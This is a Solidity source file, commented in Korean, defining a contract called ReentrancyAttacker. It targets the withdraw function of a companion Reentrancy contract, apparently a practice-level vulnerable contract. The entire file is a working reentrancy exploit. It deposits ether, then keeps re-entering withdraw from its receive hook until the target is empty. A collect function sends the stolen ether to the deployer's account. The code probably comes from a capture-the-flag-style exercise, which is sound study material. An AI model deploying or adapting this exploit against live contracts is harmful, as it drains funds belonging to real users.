// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Reentrancy} from "./Reentrancy.sol";

/// @title ReentrancyAttacker — Reentrancy.withdraw() 재진입 공격 컨트랙트
contract ReentrancyAttacker {
    Reentrancy public immutable target;
    address public immutable owner;
    uint256 public constant UNIT = 0.1 ether;

    constructor(address _target) {
        target = Reentrancy(payable(_target));
        owner = msg.sender;
    }

    /// @notice msg.value 만큼 예치한 뒤 같은 금액을 출금 → 재진입 시작.
    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    /// @notice 잔액 차감 전에 다시 withdraw를 호출해 컨트랙트가 빌 때까지 반복 인출.
    receive() external payable {
        if (address(target).balance >= UNIT) {
            target.withdraw(UNIT);
        }
    }

    /// @notice 탈취한 ETH를 공격자 EOA로 회수.
    function collect() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "collect: failed");
    }
}
